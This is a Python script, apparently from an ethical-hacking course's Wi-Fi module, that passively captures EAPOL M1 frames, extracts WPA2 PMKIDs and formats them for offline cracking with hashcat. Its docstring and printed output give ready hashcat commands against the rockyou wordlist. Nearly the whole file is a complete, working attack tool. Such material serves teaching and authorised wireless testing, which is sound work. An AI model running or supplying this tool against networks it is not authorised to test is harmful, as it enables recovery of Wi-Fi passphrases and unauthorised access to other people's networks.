#!/usr/bin/env python3
"""
04_attacks/04_pmkid_extractor.py — Extract PMKIDs from EAPOL M1 frames.

The classic WPA2 attack requires a full 4-way handshake (client must connect).
The PMKID attack, published by Jens Steube (hashcat author) in 2018, works
with just the first EAPOL message from the AP — no client needed.

The PMKID is computed by the AP as:
    PMKID = HMAC-SHA1-128(PMK, "PMK Name" || AP_MAC || STA_MAC)

It's appended to M1 in the RSN IE of the key data. We extract it,
format it for hashcat, and move on. Very efficient. Very elegant.

Works against: WPA2-Personal (PSK). Does NOT work against WPA3 (SAE).

Output format (hashcat -m 22000):
    PMKID*AP_MAC*STA_MAC*SSID_HEX

Usage:
    sudo python3 04_attacks/04_pmkid_extractor.py --iface wlan1 --output pmkids.txt
    sudo python3 04_attacks/04_pmkid_extractor.py --iface wlan1 --bssid AA:BB:CC:DD:EE:FF

Then crack:
    hashcat -m 22000 pmkids.txt rockyou.txt

Requires: pip install scapy

CYBERS3C — Ethical Hacking Postgrad — Wi-Fi Module — Session 3
"""

import argparse
import signal
import sys
import time
from datetime import datetime

try:
    from scapy.all import Dot11, Dot11Beacon, EAPOL, sniff
except ImportError:
    print("[!] Scapy missing. pip install scapy")
    sys.exit(1)

# --- make wifi_utils (repo root) importable from any topic subfolder ---
import os, sys
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from wifi_utils import (
    get_ssid,
    require_root,
    require_monitor_mode,
    add_iface_arg,
    add_duration_arg,
    add_bssid_arg,
    parse_bssid_arg,
    format_mac_plain,
)


# ──────────────────────────────────────────────
# EAPOL Key frame layout (raw bytes from pkt[EAPOL]):
#
#  Offset  Size  Field
#  0       1     EAPOL Version
#  1       1     EAPOL Type (3 = Key)
#  2       2     Body Length (big-endian)
#  4       1     Key Descriptor Type (2 = RSN)
#  5       2     Key Information
#  7       2     Key Length
#  9       8     Replay Counter
#  17      32    Nonce (ANonce in M1)
#  49      16    Key IV
#  65      8     Key RSC
#  73      8     Key ID
#  81      16    Key MIC  (all zeros in M1)
#  97      2     Key Data Length (big-endian)
#  99      var   Key Data  ← RSN IE with PMKID lives here
# ──────────────────────────────────────────────

def _is_m1(raw: bytes) -> bool:
    """
    Check if this is EAPOL M1 (first message from AP).
    Key Information: ACK=1, MIC=0, Install=0, Secure=0.
    """
    if len(raw) < 7:
        return False
    key_info = (raw[5] << 8) | raw[6]
    ack     = bool(key_info & 0x0080)
    mic     = bool(key_info & 0x0100)
    install = bool(key_info & 0x0040)
    secure  = bool(key_info & 0x0200)
    return ack and not mic and not install and not secure


def _extract_pmkid(raw: bytes) -> bytes | None:
    """
    Walk the Key Data field of an EAPOL M1 frame looking for a RSN IE
    that contains a PMKID list. Returns the first PMKID (16 bytes) or None.

    RSN IE structure inside Key Data:
        0x30        Tag ID (RSN)
        len         1 byte
        version     2 bytes (0x01 0x00)
        group       4 bytes
        pw count    2 bytes
        pw suites   N*4 bytes
        akm count   2 bytes
        akm suites  N*4 bytes
        rsn caps    2 bytes
        pmkid count 2 bytes  ← we need at least 1
        pmkid[0]    16 bytes ← this is the PMKID
    """
    if len(raw) < 99:
        return None

    key_data_len = (raw[97] << 8) | raw[98]
    if key_data_len == 0 or len(raw) < 99 + key_data_len:
        return None

    key_data = raw[99: 99 + key_data_len]

    # Walk the Key Data looking for RSN IE (tag 0x30)
    pos = 0
    while pos + 2 <= len(key_data):
        tag_id  = key_data[pos]
        tag_len = key_data[pos + 1]
        pos += 2

        if pos + tag_len > len(key_data):
            break

        if tag_id == 0x30:  # RSN Information Element
            ie = key_data[pos: pos + tag_len]
            pmkid = _parse_rsn_for_pmkid(ie)
            if pmkid:
                return pmkid

        pos += tag_len

    return None


def _parse_rsn_for_pmkid(ie: bytes) -> bytes | None:
    """
    Navigate through a RSN IE to reach the PMKID list.
    Each field has a fixed or count-determined length — we skip through them.
    Returns the first PMKID (16 bytes) or None if absent/malformed.
    """
    try:
        p = 0
        if p + 2 > len(ie): return None
        p += 2  # skip version

        if p + 4 > len(ie): return None
        p += 4  # skip group cipher suite

        if p + 2 > len(ie): return None
        pw_count = int.from_bytes(ie[p:p+2], "little")
        p += 2
        p += pw_count * 4  # skip pairwise cipher suites

        if p + 2 > len(ie): return None
        akm_count = int.from_bytes(ie[p:p+2], "little")
        p += 2
        p += akm_count * 4  # skip AKM suites

        if p + 2 > len(ie): return None
        p += 2  # skip RSN capabilities

        if p + 2 > len(ie): return None
        pmkid_count = int.from_bytes(ie[p:p+2], "little")
        p += 2

        if pmkid_count == 0:
            return None  # no PMKID attached — some APs don't include it

        if p + 16 > len(ie): return None
        return ie[p: p + 16]  # 16-byte PMKID

    except Exception:
        return None


# ──────────────────────────────────────────────
# AP SSID bookkeeping (for output formatting)
# ──────────────────────────────────────────────

_ap_ssids:  dict[str, str]   = {}   # bssid → ssid
_found:     dict[str, bytes] = {}   # bssid → pmkid bytes
_output_lines: list[str]     = []   # hashcat lines
_start_time = time.time()
_target_bssid: str | None = None


def _record_beacon(pkt):
    if not pkt.haslayer(Dot11Beacon):
        return
    dot11 = pkt[Dot11]
    bssid = dot11.addr3
    if not bssid:
        return
    bssid = bssid.lower()
    if bssid in _ap_ssids:
        return
    ssid = get_ssid(pkt)
    _ap_ssids[bssid] = ssid


def handle_packet(pkt):
    _record_beacon(pkt)

    if not pkt.haslayer(EAPOL) or not pkt.haslayer(Dot11):
        return

    dot11 = pkt[Dot11]
    fc_ds = dot11.FCfield & 0x03

    # M1 comes FROM the AP (FromDS bit set)
    if fc_ds == 0b10:
        bssid, sta = dot11.addr2, dot11.addr1
    else:
        return  # M1 always comes from AP; skip other directions

    if not bssid or not sta:
        return

    bssid = bssid.lower()
    sta   = sta.lower()

    if _target_bssid and bssid != _target_bssid:
        return
    if bssid in _found:
        return  # already have PMKID for this AP

    raw = bytes(pkt[EAPOL])
    if not _is_m1(raw):
        return

    pmkid = _extract_pmkid(raw)
    if not pmkid:
        elapsed = int(time.time() - _start_time)
        print(f"\r  [M1 seen] {bssid}  STA:{sta}  no PMKID in this M1  {elapsed}s   ",
              end="", flush=True)
        return

    # We have a PMKID!
    _found[bssid] = pmkid
    ssid     = _ap_ssids.get(bssid, "")
    ssid_hex = ssid.encode("utf-8").hex()
    pmkid_hex = pmkid.hex()

    # hashcat 22000 format: pmkid*ap_mac*sta_mac*ssid_hex
    line = f"{pmkid_hex}*{format_mac_plain(bssid)}*{format_mac_plain(sta)}*{ssid_hex}"
    _output_lines.append(line)

    ts = datetime.now().strftime("%H:%M:%S")
    print(f"\n\n  [✓] PMKID EXTRACTED @ {ts}")
    print(f"      BSSID : {bssid}")
    print(f"      STA   : {sta}")
    print(f"      SSID  : {ssid or '(unknown)'}")
    print(f"      PMKID : {pmkid_hex}")
    print(f"      Line  : {line}")
    print(f"\n      hashcat -m 22000 '{line}' rockyou.txt\n")


def save_output(path: str):
    if not _output_lines:
        print("\n[!] No PMKIDs extracted. Possible reasons:")
        print("    • AP doesn't include PMKID in M1 (vendor decision)")
        print("    • No EAPOL M1 frames seen (no client activity)")
        print("    • Wrong channel")
        return
    try:
        with open(path, "w") as fh:
            fh.write("\n".join(_output_lines) + "\n")
        print(f"[+] Saved {len(_output_lines)} PMKID(s) → {path}")
        print(f"    hashcat -m 22000 {path} rockyou.txt")
    except OSError as e:
        print(f"[!] Could not write to '{path}': {e}")


def print_summary():
    elapsed = int(time.time() - _start_time)
    print(f"\n\n{'═' * 55}")
    print(f"  PMKIDs extracted : {len(_found)}")
    print(f"  Duration         : {elapsed}s")
    print(f"{'═' * 55}")
    for bssid, pmkid in _found.items():
        ssid = _ap_ssids.get(bssid, "?")
        print(f"  {bssid}  SSID:{ssid}  PMKID:{pmkid.hex()[:16]}...")


def main():
    global _target_bssid

    require_root()

    parser = argparse.ArgumentParser(
        description=(
            "Extract PMKIDs from EAPOL M1 frames — WPA2 cracking without a client."
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "The PMKID attack (Steube, 2018) needs only EAPOL M1 from the AP.\n"
            "No client deauth required. Just wait for any association attempt.\n\n"
            "Does NOT work against WPA3 (SAE) — PMF makes it irrelevant there.\n\n"
            "Output format: PMKID*AP_MAC*STA_MAC*SSID_HEX (hashcat -m 22000)"
        ),
    )
    add_iface_arg(parser)
    add_bssid_arg(parser)
    parser.add_argument("--channel",  type=int, default=None,
                        help="Lock to this channel (recommended)")
    parser.add_argument("--output",   default="pmkids.txt",
                        help="Output file for hashcat (default: pmkids.txt)")
    add_duration_arg(parser)
    args = parser.parse_args()

    _target_bssid = parse_bssid_arg(args.bssid)

    if args.channel:
        import subprocess
        r = subprocess.run(
            ["iw", "dev", args.iface, "set", "channel", str(args.channel)],
            capture_output=True, text=True,
        )
        if r.returncode == 0:
            print(f"[*] Locked to channel {args.channel}")

    require_monitor_mode(args.iface)

    print(f"\n=== 04_attacks/04_pmkid_extractor.py ===")
    print(f"    Interface  : {args.iface}")
    print(f"    Target     : {_target_bssid or 'any AP'}")
    print(f"    Output     : {args.output}")
    print(f"    Mode       : PASSIVE — sending NO frames")
    print()
    print("    Waiting for EAPOL M1 frames (any client association) ...")
    print("    Ctrl-C to stop.\n")

    def on_sigint(sig, frame):
        print_summary()
        save_output(args.output)
        sys.exit(0)

    signal.signal(signal.SIGINT, on_sigint)

    timeout = args.duration if args.duration > 0 else None
    sniff(
        iface=args.iface,
        prn=handle_packet,
        store=False,
        timeout=timeout,
        lfilter=lambda p: p.haslayer(Dot11Beacon) or p.haslayer(EAPOL),
    )

    print_summary()
    save_output(args.output)


if __name__ == "__main__":
    main()
